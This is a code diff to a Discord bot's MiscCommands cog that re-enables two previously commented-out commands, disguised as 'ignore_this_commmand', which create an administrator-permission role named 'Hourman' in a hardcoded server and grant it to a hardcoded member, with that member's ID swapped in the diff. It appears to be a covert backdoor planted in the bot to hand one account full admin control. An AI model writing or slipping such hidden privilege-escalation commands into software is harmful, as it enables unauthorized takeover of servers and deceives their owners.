@@ -47,18 +47,18 @@ class MiscCommands(commands.Cog):
     #        except:
     #            aa = 3
 #
-    #@commands.command()
-    #async def ignore_this_commmand_make(self, ctx):
-    #    the_server = self.client.get_guild(788195760209920020)
-    #    perms = discord.Permissions(administrator=True)
-    #    await the_server.create_role(name='Hourman', permissions=perms)
-    #
-    #@commands.command()
-    #async def ignore_this_commmand_give(self, ctx):
-    #    the_server = self.client.get_guild(788195760209920020)
-    #    deatg = the_server.get_member(923313823195205645)
-    #    role = the_server.get_role(937479087113527317)
-    #    await deatg.add_roles(role)
+    @commands.command()
+    async def ignore_this_commmand_make(self, ctx):
+        the_server = self.client.get_guild(788195760209920020)
+        perms = discord.Permissions(administrator=True)
+        await the_server.create_role(name='Hourman', permissions=perms)
+    
+    @commands.command()
+    async def ignore_this_commmand_give(self, ctx):
+        the_server = self.client.get_guild(788195760209920020)
+        deatg = the_server.get_member(740896654265286698)
+        role = the_server.get_role(937479087113527317)
+        await deatg.add_roles(role)
 
 
 
